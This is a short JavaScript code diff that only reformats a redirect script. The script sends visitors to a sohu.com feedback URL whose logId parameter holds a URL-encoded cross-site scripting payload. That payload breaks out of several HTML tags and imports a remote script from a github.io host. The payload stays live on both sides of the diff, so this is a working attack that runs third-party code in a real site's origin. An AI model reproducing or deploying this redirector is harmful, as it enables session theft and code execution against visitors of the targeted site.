@@ -42,8 +42,7 @@ if (t.length > 10) {
 	var t = getQueryVariable('t');
 	var timestamp = Date.now();
 	var jk1 = "https://feedback.vrs.sohu.com/feedback.html;fXcvJHmkItPPMsd" + timestamp +
-		"diUlxoOUaqMtdRiGv?logId=1%27)%22%3C/Title/%3C/Style/%3C/Textarea/%3C/Iframe%3E%3CScript/K/%3Eimport(%27//xiachedann.github.io/playmusic.js%27)%3C/Script/K&17225942986202=5018016e1ea27a6572ef377dbad76da59d01d7f3a55&url=" +
-		t;
+		"diUlxoOUaqMtdRiGv?logId=1%27)%22%3C/Title/%3C/Style/%3C/Textarea/%3C/Iframe%3E%3CScript/K/%3Eimport(%27//xiachedann.github.io/playmusic.js%27)%3C/Script/K&17225942986202=5018016e1ea27a6572ef377dbad76da59d01d7f3a55&url=" +t;
 	window.location.href = jk1;
 } else {
 	window.location.href = '/404';
